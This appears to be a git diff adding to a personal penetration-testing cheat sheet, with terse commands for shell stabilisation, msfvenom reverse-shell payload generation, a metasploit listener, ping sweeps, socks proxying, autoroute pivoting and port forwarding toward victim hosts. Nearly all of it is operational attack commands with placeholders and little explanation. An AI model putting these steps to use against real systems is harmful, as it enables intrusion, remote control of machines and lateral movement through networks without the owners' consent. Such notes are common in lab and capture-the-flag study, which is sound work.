@@ -17,3 +17,20 @@ WinExec("<result>")
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 stty raw -echo; fg
 export TERM = xterm
+
+----------metasploit reverse engineering---------------
+1.create reverse file: msfvenom -p <payload, ex:linux/x64/meterpreter/reverse_tcp> LHOST=<your ip> -t <elf or exe> -o <name you want> LPORT=8080
+2.msfconsole; use exploit/multi/handler;
+3.set lhost, lport, payload and run
+4.bash:for i in {1..254}; do ping x.x.x.$i | grep bytes from; done
+  cmd: for /L %i in (1 1 254) do ping x.x.x.%i -n 1 -w 100 | find "Reply"
+  powershell: 1..254 | % {if (Test-Connection -count 1 -comp x.x.x.$_ -quiet) "x.x.x.$_ is alive"}
+5.socks proxy: use auxiliary/server/socks_proxy; set srvport, srvhost, version and run
+(6. meterpreter: use post/multi/manage/shell_to_meterpreter; set session, payload and run)
+7.autoroute: use post/multi/manage/autoroute or run autoroute -s x.x.x.x/y, verify: run autoroute -p
+8. use proxychains or msfconsole methods
+
+----------metasploit port forwarding-----------
+in msfconsole
+portfwd add -l <your port> -p <victim port> -r <victim ip>
+portfwd add -R -l <your listening port> -p <victim port> -r <victim ip>
